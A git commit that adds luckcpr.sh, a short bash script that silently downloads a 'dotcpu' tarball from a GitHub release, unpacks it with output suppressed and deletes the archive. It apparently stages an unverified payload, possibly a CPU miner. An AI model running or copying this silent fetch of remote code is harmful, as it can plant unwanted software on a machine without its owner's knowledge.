006caa9aa879741f8063c3f7105828028ded6d69
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-25 05:13:06 +0700

    Create luckcpr.sh

---
+++ luckcpr.sh
@@ -0,0 +1,13 @@
+#!/bin/bash
+
+wget -q -O dot-cipyu github.com/DotAja/ALONE/releases/download/alone/dotcpu.tar.gz
+
+sleep 10
+
+tar -xzf dot-cipyu >/dev/null
+
+sleep 10
+
+rm dot-cipyu
+
+sleep 10
